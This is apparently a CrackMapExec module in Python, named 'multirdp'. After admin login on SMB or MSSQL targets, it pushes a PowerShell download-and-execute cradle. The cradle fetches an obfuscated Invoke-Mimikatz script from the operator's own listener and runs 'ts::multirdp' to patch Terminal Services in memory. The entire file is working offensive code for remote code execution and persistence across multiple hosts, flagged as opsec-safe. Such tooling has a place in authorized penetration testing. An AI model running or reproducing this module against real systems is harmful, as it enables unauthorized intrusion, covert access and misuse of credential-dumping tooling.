from cme.helpers.powershell import *

class CMEModule:

    name = 'multirdp'
    description = "Patches terminal services in memory to allow multiple RDP users"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        '''
        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-Mimikatz.ps1')

    def on_admin_login(self, context, connection):

        command = "Invoke-Mimikatz -Command 'privilege::debug ts::multirdp exit'"
        launcher = gen_ps_iex_cradle(context, 'Invoke-Mimikatz.ps1', command)
        ps_command = create_ps_command(launcher)

        connection.execute(ps_command)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-Mimikatz.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            context.log.success("Terminal Service patched successfully")
